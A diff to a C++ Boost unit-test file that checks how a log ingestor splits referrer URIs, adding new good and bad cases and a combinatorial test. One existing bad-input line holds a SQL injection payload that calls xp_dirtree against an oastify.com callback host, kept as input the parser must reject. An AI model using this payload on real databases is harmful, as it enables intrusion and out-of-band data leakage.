@@ -768,6 +768,7 @@ BOOST_DATA_TEST_CASE(DecomposeReferrerUriBad,
 				"www.google.com/",
 				"www.google.com/path",
 				R"(http://portage.randomdan.homeip.net/');declare @q varchar(99);set @q='\\mh7bick2533bv3lybfcok0vwangg48szlnga7yw.oasti'+'fy.com\tqa'; exec master.dbo.xp_dirtree @q;--)",
+				"android-app://com.google.android.googlequicksearchbox/",
 		}),
 		uri)
 {
@@ -777,6 +778,8 @@ BOOST_DATA_TEST_CASE(DecomposeReferrerUriBad,
 BOOST_DATA_TEST_CASE(DecomposeReferrerUri,
 		boost::unit_test::data::make<DecomposeUriData>({
 				{"https://www.example.com", "https", "www.example.com", "", std::nullopt, "https://www.example.com"},
+				{"https://www.example.com/", "https", "www.example.com", "/", std::nullopt, "https://www.example.com/"},
+				{"https://www.example.com?q=s", "https", "www.example.com", "", "q=s", "https://www.example.com?q=s"},
 				{"https://john.doe@www.example.com:1234/forum/questions/?tag=networking&order=newest#top", "https",
 						"www.example.com", "/forum/questions/", "tag=networking&order=newest",
 						"https://www.example.com/forum/questions/?tag=networking&order=newest"},
@@ -802,4 +805,16 @@ BOOST_DATA_TEST_CASE(DecomposeReferrerUri,
 	std::string recomposed;
 	(*select)[0] >> recomposed;
 	BOOST_CHECK_EQUAL(recomposed, recomposedUri);
+}
+
+BOOST_DATA_TEST_CASE(DecomposeReferrerUriMix,
+		boost::unit_test::data::make<std::string>("http", "https", "ftp", "foo-bar")
+				* boost::unit_test::data::make<std::string>("short", "example.com", "www.example.com", "www.foo-bar.jk")
+				* boost::unit_test::data::make<std::string>("", "/", "/path", "/path/to/thing")
+				* boost::unit_test::data::make<std::string>("", "?", "?q=s", "?query=string&foo=bar"),
+		scheme, host, path, queryString)
+{
+	const auto fullUri = scheme + "://" + host + path + queryString;
+	BOOST_TEST_INFO(fullUri);
+	BOOST_CHECK(Ingestor::decomposeReferrer(fullUri));
 }
